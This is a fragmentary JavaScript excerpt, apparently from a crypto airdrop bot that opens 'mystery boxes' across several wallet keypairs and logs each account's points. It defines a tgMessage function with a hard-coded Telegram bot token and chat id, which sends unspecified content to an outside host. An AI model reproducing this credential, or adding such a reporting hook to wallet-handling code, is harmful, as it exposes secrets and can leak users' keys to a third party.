...
const tgMessage = async (message) => {
    const token = '7217207955:AAHWEOdAcKB0T6bM8Fqh5-lQDQM1MBE2PuQ';
    const chatid = '591965943';
...
Status       : [${(i + 1)}/${totalBox}] You got ${openedBox} points!`
        ...
        // Check if Mystery Box count is 0 after opening
            if (info.ring_monitor === 0) {
                twisters.put(`${publicKey}`, {
                    text: ` === ACCOUNT ${(index + 1)} ===
Address      : ${publicKey}
Points       : ${info.ring}
Mystery Box  : ${info.ring_monitor}
Status       : Mystery Box count is 0, skipping to next keypair...`
                });
            continue; // Skip to next keypair
            }
